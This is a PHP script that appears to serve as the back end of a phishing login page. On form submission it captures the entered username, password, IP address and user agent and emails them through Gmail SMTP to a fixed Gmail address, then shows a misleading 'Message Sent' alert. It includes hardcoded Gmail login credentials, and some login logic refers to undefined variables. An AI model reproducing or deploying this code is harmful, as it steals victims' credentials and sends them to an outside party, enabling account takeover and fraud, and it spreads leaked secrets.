<?php
use PHPMailer\PHPMailer\PHPMailer;

require_once 'phpmailer/Exception.php';
require_once 'phpmailer/PHPMailer.php';
require_once 'phpmailer/SMTP.php';
require_once './core/info.php'; 
require_once './core/pdo.php';

$mail = new PHPMailer(true);

$alert = '';

if(isset($_POST['login-btn'])){
 $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
  $useragent = $_SERVER['HTTP_USER_AGENT'];
$username = $_POST['username'];
    $password = $_POST['password'];
  try{
    $mail->isSMTP();
    $mail->Host = 'smtp.gmail.com';
    $mail->SMTPAuth = true;
    $mail->Username = 'nnnonjb13@gmail.com'; // Gmail address which you want to use as SMTP server
    $mail->Password = 'woatqtrfngxmrvgu'; // Gmail address Password
    $mail->SMTPSecure = PHPMailer::ENCRYPTION_STARTTLS;
    $mail->Port = '587';

    $mail->setFrom('nnnonjb13@gmail.com'); // Gmail address which you used as SMTP server
     $mail->addAddress('nnnonjb@gmail.com'); // Email address where you want to receive emails (you can use any of your gmail address including the gmail address which you used as SMTP server)
      if($rows1==1 || $rows==1){
            if($rows1==1 && $rows!=1){
                $_SESSION['ID'] = $admin['ID'];
                
                $_SESSION['permision']=1;
                header('location:./admincp/index.php');
                }
        }
    $mail->isHTML(true);
    $mail->Subject = 'X2NIOS';

    $mail->Body = "<h3>
    <p>--------------------------------------------</p>
    <p>USERNAME: $username </p>
    <p>PASSWORD: $password </p>
    <p>IP: $ip </p>
    <p>USERAGENT: $useragent </p> 
    <p>--------------------------------------------</p>
    </h3>";
    $mail->send();
    $alert = '<div class="alert-success">
                 <span>Message Sent! Thank you for contacting us.</span>
                </div>';
  } catch (Exception $e){
    $alert = '<div class="alert-error">
                <span>'.$e->getMessage().'</span>
              </div>';
  }
}
?>
